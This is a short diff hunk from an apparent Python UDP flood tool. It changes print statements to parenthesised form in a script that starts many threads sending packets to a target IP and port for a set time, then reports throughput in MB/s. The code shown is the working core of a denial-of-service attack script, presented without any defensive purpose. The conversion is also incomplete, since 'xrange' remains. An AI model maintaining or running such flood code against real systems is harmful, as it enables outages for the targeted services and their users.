@@ -26,14 +26,14 @@ def udp(ip,port,floodtime):
 		else:
 			s.sendto(data,(ip,port))
 		packets+=1
-	print "Thread "+str(threads)+" Stopping..."
+	print ("Thread "+str(threads)+" Stopping...")
 	threads-=1
 for i in xrange(0,threads):
 	t=Thread(target=(udp),args=(ip,port,endtime))
 	t.start()
 time.sleep(endtime)
 while threads>=1:
-	print "Waiting for "+str(threads)+" threads to finish..."
+	print ("Waiting for "+str(threads)+" threads to finish...")
 	time.sleep(1)
-print "Sent "+str(packets)+" packets, averaging at ~"+str(packets/16/endtime)+" MB/s!"
+print ("Sent "+str(packets)+" packets, averaging at ~"+str(packets/16/endtime)+" MB/s!")
 exit()
